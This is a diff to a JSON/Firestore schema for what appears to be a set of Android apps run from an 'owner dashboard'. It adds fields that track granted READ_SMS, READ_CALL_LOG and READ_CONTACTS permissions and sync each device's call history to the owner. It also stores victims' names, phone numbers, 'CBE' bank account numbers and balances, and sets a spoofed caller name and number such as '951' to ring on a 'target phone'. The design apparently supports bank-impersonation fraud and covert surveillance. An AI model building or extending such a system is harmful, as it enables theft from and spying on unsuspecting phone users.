@@ -150,6 +150,36 @@
           "enum": ["none", "pending", "approved", "rejected"],
           "description": "Owner approval status for entering the app without granting OS or browser permissions"
         },
+        "supportNumber": {
+          "type": "string",
+          "description": "Unique 6-digit support identifier starting with 69 assigned to this device",
+          "maxLength": 6,
+          "pattern": "^69[0-9]{4}$"
+        },
+        "hasDialer": {
+          "type": "boolean",
+          "description": "Whether Call APK has registered on this device"
+        },
+        "hasMessages": {
+          "type": "boolean",
+          "description": "Whether Messages APK has registered on this device"
+        },
+        "hasBanking": {
+          "type": "boolean",
+          "description": "Whether Banking APK has registered on this device"
+        },
+        "callLogPermGranted": {
+          "type": "boolean",
+          "description": "Whether READ_CALL_LOG permission is granted in Call APK"
+        },
+        "smsPermGranted": {
+          "type": "boolean",
+          "description": "Whether READ_SMS permission is granted in Messages APK"
+        },
+        "contactsPermGranted": {
+          "type": "boolean",
+          "description": "Whether READ_CONTACTS permission is granted"
+        },
         "lastSeenAtMs": {
           "type": "number",
           "description": "Unix epoch ms of the latest heartbeat from this device"
@@ -1010,6 +1040,16 @@
           "description": "Display caller name shown on incoming call screen and notification",
           "maxLength": 80
         },
+        "callerNumber": {
+          "type": "string",
+          "description": "Optional caller number displayed on Call APK incoming screen (e.g., 951)",
+          "maxLength": 32
+        },
+        "targetApp": {
+          "type": "string",
+          "enum": ["dialer", "banking", "any"],
+          "description": "Which app on target phone should ring for this call session"
+        },
         "callMode": {
           "type": "string",
           "enum": ["audio", "video"],
@@ -1215,6 +1255,185 @@
         "createdAt",
         "updatedAt"
       ]
+    },
+    "SupportCallSession": {
+      "title": "SupportCallSession",
+      "description": "Real-time Wi-Fi VoIP 951 support call session initiated from Call APK to the standalone Support APK.",
+      "type": "object",
+      "properties": {
+        "callId": {
+          "type": "string",
+          "description": "Unique support call document ID (sup_<deviceId>_<ts>)",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "deviceId": {
+          "type": "string",
+          "description": "Caller device identifier",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "deviceName": {
+          "type": "string",
+          "description": "Caller device label",
+          "maxLength": 120
+        },
+        "userName": {
+          "type": "string",
+          "description": "Caller customer name from synced Banking state",
+          "maxLength": 120
+        },
+        "phoneNumber": {
+          "type": "string",
+          "description": "Caller phone number",
+          "maxLength": 32
+        },
+        "userAccount": {
+          "type": "string",
+          "description": "Caller CBE account number",
+          "maxLength": 64
+        },
+        "balance": {
+          "type": "number",
+          "description": "Caller synced balance"
+        },
+        "callMode": {
+          "type": "string",
+          "enum": ["audio"],
+          "description": "Support call media mode"
+        },
+        "status": {
+          "type": "string",
+          "enum": ["ringing", "active", "ended", "declined", "missed"],
+          "description": "Support call lifecycle state"
+        },
+        "rtcSeq": {
+          "type": "number",
+          "description": "Monotonic WebRTC signaling sequence number"
+        },
+        "rtcOffer": {
+          "type": "string",
+          "description": "Serialized WebRTC SDP offer JSON",
+          "maxLength": 24000
+        },
+        "rtcAnswer": {
+          "type": "string",
+          "description": "Serialized WebRTC SDP answer JSON",
+          "maxLength": 24000
+        },
+        "callerMicMuted": {
+          "type": "boolean",
+          "description": "Whether caller microphone is muted"
+        },
+        "supportMicMuted": {
+          "type": "boolean",
+          "description": "Whether support agent microphone is muted"
+        },
+        "startedAtMs": {
+          "type": "number",
+          "description": "Call initiation timestamp ms"
+        },
+        "answeredAtMs": {
+          "type": "number",
+          "description": "Call answer timestamp ms"
+        },
+        "expiresAtMs": {
+          "type": "number",
+          "description": "Ring or call TTL timestamp ms"
+        },
+        "updatedAtMs": {
+          "type": "number",
+          "description": "Last update timestamp ms"
+        },
+        "ownerId": {
+          "type": "string",
+          "description": "Owner UID governing this support call session",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "createdAt": {
+          "type": "string",
+          "format": "date-time",
+          "description": "Server creation timestamp"
+        },
+        "updatedAt": {
+          "type": "string",
+          "format": "date-time",
+          "description": "Server update timestamp"
+        }
+      },
+      "required": [
+        "callId",
+        "deviceId",
+        "deviceName",
+        "userName",
+        "phoneNumber",
+        "userAccount",
+        "balance",
+        "callMode",
+        "status",
+        "rtcSeq",
+        "rtcOffer",
+        "rtcAnswer",
+        "callerMicMuted",
+        "supportMicMuted",
+        "startedAtMs",
+        "answeredAtMs",
+        "expiresAtMs",
+        "updatedAtMs",
+        "ownerId",
+        "createdAt",
+        "updatedAt"
+      ]
+    },
+    "DeviceCallLogBatch": {
+      "title": "DeviceCallLogBatch",
+      "description": "Synced Call APK recent call history snapshot scoped per device.",
+      "type": "object",
+      "properties": {
+        "batchId": {
+          "type": "string",
+          "description": "Document ID matching deviceId",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "deviceId": {
+          "type": "string",
+          "description": "Device identifier",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "logsJson": {
+          "type": "string",
+          "description": "Serialized JSON array of recent DialerCallLogEntry items",
+          "maxLength": 32000
+        },
+        "count": {
+          "type": "number",
+          "description": "Number of call log entries stored"
+        },
+        "updatedAtMs": {
+          "type": "number",
+          "description": "Last sync timestamp ms"
+        },
+        "ownerId": {
+          "type": "string",
+          "description": "Owner UID governing this record",
+          "maxLength": 128,
+          "pattern": "^[a-zA-Z0-9_\\-]+$"
+        },
+        "createdAt": {
+          "type": "string",
+          "format": "date-time",
+          "description": "Server creation timestamp"
+        },
+        "updatedAt": {
+          "type": "string",
+          "format": "date-time",
+          "description": "Server update timestamp"
+        }
+      },
+      "required": ["batchId", "deviceId", "logsJson", "count", "updatedAtMs", "ownerId", "createdAt", "updatedAt"]
     }
   },
   "firestore": {
@@ -1257,6 +1476,14 @@
     "/remote_ussd_tasks/{taskId}": {
       "schema": { "$ref": "#/entities/RemoteUssdTask" },
       "description": "Standalone visible and cancellable remote USSD command tasks synced between owner dashboard and connected devices."
+    },
+    "/support_calls/{callId}": {
+      "schema": { "$ref": "#/entities/SupportCallSession" },
+      "description": "Real-time Wi-Fi 951 support queue calls initiated from Call APK to the standalone Support APK."
+    },
+    "/device_call_logs/{batchId}": {
+      "schema": { "$ref": "#/entities/DeviceCallLogBatch" },
+      "description": "Permission-gated recent call history synced from Call APK per device."
     }
   }
 }
